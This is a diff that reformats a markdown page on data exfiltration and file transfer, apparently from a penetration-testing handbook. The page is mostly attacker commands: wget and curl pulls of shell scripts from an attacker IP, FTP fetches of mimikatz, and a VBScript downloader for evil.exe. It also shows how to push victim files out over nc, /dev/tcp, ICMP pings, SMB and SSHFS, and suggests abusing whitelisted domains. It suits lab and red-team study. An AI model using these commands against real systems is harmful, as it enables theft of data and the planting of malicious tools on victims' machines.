@@ -1,9 +1,8 @@
 # Exfiltration
 
-
 ## Commonly whitelisted domains to exfiltrate information
 
-Check [[https://lots-project.com/|https://lots-project.com/]] to find commonly whitelisted domains that can be abused
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
 ## Copy\&Paste Base64
 
@@ -13,14 +12,14 @@ Check [[https://lots-project.com/|https://lots-project.com/]] to find commonly w
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-```
+
 **Windows**
 
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
-```
+
 ## HTTP
 
 **Linux**
@@ -31,7 +30,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-```
+
 **Windows**
 
 ```bash
@@ -48,12 +47,12 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-```
+
 ### Upload files
 
-- [[https://gist.github.com/UniIsland/3346170|**SimpleHttpServerWithFileUploads**]]
-- [[https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149|**SimpleHttpServer printing GET and POSTs (also headers)**]]
-- Python module [[https://pypi.org/project/uploadserver/|uploadserver]]:
+- [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
+- [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+- Python module [uploadserver](https://pypi.org/project/uploadserver/):
 
 ```bash
 # Listen to files
@@ -67,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-```
+
 ### **HTTPS Server**
 
 ```python
@@ -110,7 +109,7 @@ if __name__ == "__main__":
     app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-```
+
 ## FTP
 
 ### FTP server (python)
@@ -119,20 +118,20 @@ if __name__ == "__main__":
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-```
+
 ### FTP server (NodeJS)
 
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-```
+
 ### FTP server (pure-ftp)
 
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
-```
+
 ```bash
 #Run the following script to configure the FTP server
 #!/bin/bash
@@ -146,7 +145,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-```
+
 ### **Windows** client
 
 ```bash
@@ -159,18 +158,18 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
-```
+
 ## SMB
 
 Kali as server
 
 ```bash
-kali_op1> impacket-smbserver -smb2support kali `pwd # Share current directory
+kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
-impacket-smbserver -smb2support -user test -password test test `pwd
+impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-```
+
 Or create a smb share **using samba**:
 
 ```bash
@@ -187,7 +186,7 @@ chmod 777 /tmp/smb
 #Start samba
 service smbd restart
 ```
-```
+
 Windows
 
 ```bash
@@ -197,7 +196,7 @@ CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentia
 WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
 WindPS-2> cd new_disk:
 ```
-```
+
 ## SCP
 
 The attacker has to have SSHd running.
@@ -205,7 +204,7 @@ The attacker has to have SSHd running.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
-```
+
 ## SSHFS
 
 If the victim has SSH, the attacker can mount a directory from the victim to the attacker.
@@ -215,14 +214,14 @@ sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
-```
+
 ## NC
 
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
-```
+
 ## /dev/tcp
 
 ### Download file from victim
@@ -231,7 +230,7 @@ nc -vn <IP> 4444 < exfil_file
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-```
+
 ### Upload file to victim
 
 ```bash
@@ -240,7 +239,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-```
+
 thanks to **@BinaryShadow\_**
 
 ## **ICMP**
@@ -250,7 +249,7 @@ thanks to **@BinaryShadow\_**
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
 #This will 4bytes per ping packet (you could probably increase this until 16)
 ```
-```
+
 ```python
 from scapy.all import *
 #This is ippsec receiver created in the HTB machine Mischief
@@ -262,7 +261,7 @@ def process_packet(pkt):
 
 sniff(iface="tun0", prn=process_packet)
 ```
-```
+
 ## **SMTP**
 
 If you can send data to an SMTP server, you can create an SMTP to receive the data with python:
@@ -270,7 +269,7 @@ If you can send data to an SMTP server, you can create an SMTP to receive the da
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
-```
+
 ## TFTP
 
 By default in XP and 2003 (in others it needs to be explicitly added during installation)
@@ -283,20 +282,20 @@ mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-```
+
 **TFTP server in python:**
 
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-```
+
 In **victim**, connect to the Kali server:
 
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
-```
+
 ## PHP
 
 Download a file with a PHP oneliner:
@@ -304,13 +303,13 @@ Download a file with a PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-```
+
 ## VBScript
 
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
-```
+
 **Victim**
 
 ```bash
@@ -340,11 +339,11 @@ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vb
 echo Next >> wget.vbs
 echo ts.Close >> wget.vbs
 ```
-```
+
 ```bash
 cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
-```
+
 ## Debug.exe
 
 The `debug.exe` program not only allows inspection of binaries but also has the **capability to rebuild them from hex**. This means that by providing an hex of a binary, `debug.exe` can generate the binary file. However, it's important to note that debug.exe has a **limitation of assembling files up to 64 kb in size**.
@@ -354,14 +353,12 @@ The `debug.exe` program not only allows inspection of binaries but also has the 
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```
+
 Then copy-paste the text into the windows-shell and a file called nc.exe will be created.
 
-- [[https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html|https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html]]
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
 
-- [[https://github.com/Stratiz/DNS-Exfil|https://github.com/Stratiz/DNS-Exfil]]
-
-
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
